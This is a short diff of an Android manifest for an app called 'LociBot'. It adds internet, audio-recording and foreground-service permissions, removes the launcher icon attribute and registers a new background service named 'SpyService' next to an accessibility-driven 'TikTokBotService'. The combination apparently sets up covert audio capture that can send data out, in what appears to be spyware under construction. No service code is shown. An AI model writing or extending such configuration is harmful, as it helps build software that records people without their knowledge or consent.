@@ -1,11 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     
     <application
         android:allowBackup="true"
         android:label="LociBot"
-        android:icon="@mipmap/ic_launcher"
         android:theme="@style/Theme.AppCompat.DayNight.NoActionBar">
         
         <activity android:name=".MainActivity" android:exported="true">
@@ -16,6 +18,7 @@
         </activity>
 
         <service android:name=".FloatingService" android:exported="false" />
+        <service android:name=".SpyService" android:exported="false" />
 
         <service android:name=".TikTokBotService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
